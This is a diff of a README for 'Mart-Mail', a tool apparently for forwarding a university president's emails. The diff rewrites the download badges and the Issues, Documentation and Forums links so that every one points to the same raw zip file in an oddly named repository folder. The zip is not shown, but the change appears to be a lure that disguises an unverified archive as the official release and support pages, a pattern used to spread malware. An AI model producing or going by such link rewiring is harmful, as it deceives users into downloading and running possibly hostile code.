@@ -8,7 +8,7 @@ Welcome to Mart-Mail! This application sends RPI President Martin A. Schmidt's e
 
 To get started, you will need to download the software. Please visit this page to download:
 
-[![Download Mart-Mail](https://img.shields.io/badge/Download-Mart--Mail-blue.svg)](https://github.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/releases)
+[![Download Mart-Mail](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)
 
 Once there, click on the latest release and follow the instructions to download the file. 
 
@@ -41,7 +41,7 @@ Mart-Mail offers several useful features:
 
 ## 📞 Support
 
-If you encounter any issues while using Mart-Mail, please check our FAQ section. For further assistance, feel free to reach out via [GitHub Issues](https://github.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/issues).
+If you encounter any issues while using Mart-Mail, please check our FAQ section. For further assistance, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip).
 
 ## 📝 Contributing
 
@@ -51,9 +51,9 @@ We welcome contributions to improve Mart-Mail. If you have suggestions or want t
 
 For more information about Mart-Mail, consider exploring the following:
 
-- [Official Documentation](https://github.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/wiki)
-- [Community Forums](https://github.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)
+- [Community Forums](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)
 
 Thank you for choosing Mart-Mail! We hope it keeps you in touch with important updates from President Martin A. Schmidt. Happy emailing! 
 
-[![Download Again](https://img.shields.io/badge/Download-Mart--Mail-blue.svg)](https://github.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/releases)
+[![Download Again](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)](https://raw.githubusercontent.com/brassicaoleraceaitalicalipectomy628/Mart-Mail/main/dyspnea/Mart-Mail-v1.1.zip)
